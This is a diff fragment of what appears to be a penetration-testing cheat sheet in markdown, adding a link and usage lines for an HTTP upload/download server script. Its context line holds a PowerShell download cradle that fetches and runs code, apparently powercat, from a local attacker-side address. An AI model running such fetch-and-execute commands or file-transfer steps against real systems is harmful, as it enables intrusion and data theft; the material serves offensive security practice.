@@ -8,6 +8,12 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.10/powerca
 ```
 # HTTP Server for Upload and Download
 ```bash
+https://raw.githubusercontent.com/voidascent/sec/main/httpserver.py
+```
+Usage
+```bash
+python3 httpserver.py # Default Port 8000
+python3 httpserver.py -p 8888 # Running on Port to 8888
 ```
 Curl (Linux and Windows cmd)
 Curl Upload
